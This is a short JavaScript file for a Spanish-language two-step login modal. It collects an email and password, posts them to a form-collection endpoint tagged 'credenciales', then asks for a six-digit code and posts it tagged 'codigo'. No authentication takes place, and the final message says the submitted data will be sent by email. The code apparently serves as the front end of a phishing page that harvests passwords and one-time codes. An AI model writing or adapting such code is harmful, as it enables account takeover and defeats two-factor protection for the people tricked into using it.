const openBtn = document.getElementById('openBtn');
const closeBtn = document.getElementById('closeBtn');
const overlay = document.getElementById('overlay');
const form = document.getElementById('loginForm');
const codeInput = document.getElementById('code');
const submitBtn = document.getElementById('submitBtn');

const step1 = document.getElementById('step1');
const step2 = document.getElementById('step2');
const continueBtn = document.getElementById('continueBtn');
const backBtn = document.getElementById('backBtn');
const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');

function resetToStep1() {
  step2.hidden = true;
  step1.hidden = false;
  codeInput.required = false;
  form.reset();
  submitBtn.disabled = true;
}

openBtn.addEventListener('click', () => overlay.classList.add('is-open'));
closeBtn.addEventListener('click', () => {
  overlay.classList.remove('is-open');
  resetToStep1();
});

overlay.addEventListener('click', (e) => {
  if (e.target === overlay) {
    overlay.classList.remove('is-open');
    resetToStep1();
  }
});

continueBtn.addEventListener('click', () => {
  if (!emailInput.checkValidity() || !passwordInput.checkValidity()) {
    emailInput.reportValidity();
    passwordInput.reportValidity();
    return;
  }

  continueBtn.disabled = true;
  continueBtn.textContent = 'Enviando...';

  const data = new FormData(form);
  data.set('form-name', 'login');
  data.set('etapa', 'credenciales'); // marca este envío como el paso 1

  fetch('/', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams(data).toString(),
  })
    .then(() => {
      step1.hidden = true;
      step2.hidden = false;
      codeInput.required = true;
      codeInput.focus();
    })
    .catch(() => {
      alert('Hubo un problema al enviar tus datos. Intenta de nuevo.');
    })
    .finally(() => {
      continueBtn.disabled = false;
      continueBtn.textContent = 'Continuar';
    });
});

backBtn.addEventListener('click', () => {
  step2.hidden = true;
  step1.hidden = false;
  codeInput.required = false;
});

codeInput.addEventListener('input', () => {
  codeInput.value = codeInput.value.replace(/\D/g, '').slice(0, 6);
  submitBtn.disabled = codeInput.value.length !== 6;
});

form.addEventListener('submit', (e) => {
  e.preventDefault();
  const data = new FormData(form);
  data.set('form-name', 'login');
  data.set('etapa', 'codigo'); // marca este envío como el paso 2
  fetch('/', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams(data).toString(),
  })
    .then(() => {
      alert('¡Listo! Recibirás el correo con los datos enviados.');
      overlay.classList.remove('is-open');
      resetToStep1();
    })
    .catch(() => {
      alert('Hubo un problema al enviar el formulario. Intenta de nuevo.');
    });
});
